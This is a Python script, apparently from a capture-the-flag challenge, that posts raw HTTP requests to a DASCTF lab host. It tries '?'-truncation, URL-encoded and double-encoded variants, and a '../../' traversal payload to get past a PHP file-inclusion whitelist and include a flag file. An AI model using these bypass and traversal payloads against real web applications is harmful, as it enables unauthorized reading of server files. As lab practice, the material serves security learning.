# -*- coding: utf-8 -*-
"""Raw socket POST：排除 requests 编码差异，验证 ? 截断是否真失效"""
import socket

host = '29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com'
port = 80


def raw_post(body, path='/'):
    s = socket.create_connection((host, port), timeout=10)
    req = (
        f'POST {path} HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        'Content-Type: application/x-www-form-urlencoded\r\n'
        f'Content-Length: {len(body)}\r\n'
        'Connection: close\r\n'
        'User-Agent: Mozilla/5.0\r\n\r\n'
        + body
    )
    s.sendall(req.encode())
    resp = b''
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk
    s.close()
    return resp


tests = [
    ('file=source.php', '白名单直过'),
    ('file=source.php?x', '?截断(字面)'),
    ('file=source.php%3fx', '?截断(%3f编码)'),
    ('file=hint.php?../../ffffllllaaaagggg.php', '?截断+路径'),
    ('file=source.php%253fx', '双编码'),
]

for body, label in tests:
    resp = raw_post(body)
    head, _, body_resp = resp.partition(b'\r\n\r\n')
    first = head.split(b'\r\n')[0].decode(errors='ignore')
    L = len(body_resp)
    if b'you can\'t see it' in body_resp or (L < 500 and b'DOCTYPE' in body_resp and b'checkFile' not in body_resp):
        result = '失败(checkFile没过)'
    elif b'checkFile' in body_resp:
        result = 'include source.php 成功!'
    elif b'flag not here' in body_resp:
        result = 'include hint.php 成功!'
    elif L > 500:
        result = f'其他({L})'
    else:
        result = f'其他({L}): {body_resp[:80].decode(errors="ignore")}'
    print(f'{label:<18} body={body:<40} {first} len={L} -> {result}')
